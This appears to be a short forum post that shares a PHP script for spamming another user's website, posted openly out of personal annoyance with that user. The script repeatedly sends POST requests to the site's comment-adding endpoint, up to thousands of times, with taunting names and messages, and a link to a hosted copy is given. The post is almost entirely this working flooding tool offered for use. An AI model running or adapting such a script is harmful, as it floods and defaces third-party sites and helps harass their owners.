Here we are, I am tired of him posting his shitly coded cms.

So in the mean time spam his front page.
Link; http://thisisnow.allgamer.net/tester.php
Or source code;
[php]

<?php echo '

>3.21.10<

'; echo 'This will spam at random from 1 threw 10,000 times.'; echo '
'; if(isset($_POST["spam"])){ $url = "http://google.info/ajax.php?action=addcomment"; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_POST, 1); $i = 0; while($i < rand(1, rand(1,10000))){ //i like it when its more random. $i++; $data = array('name' => 'You\'re friends at MITB '.rand(1,9001), 'comment' => 'Doing this out of love! ('.time().') '.rand(1,9001), 'submit' => 'Submit'); curl_setopt($ch, CURLOPT_POSTFIELDS, $data); curl_exec($ch); } curl_close($ch); echo '

>Number of times spammed: '.$i.'<

'; } ?>

[/php]
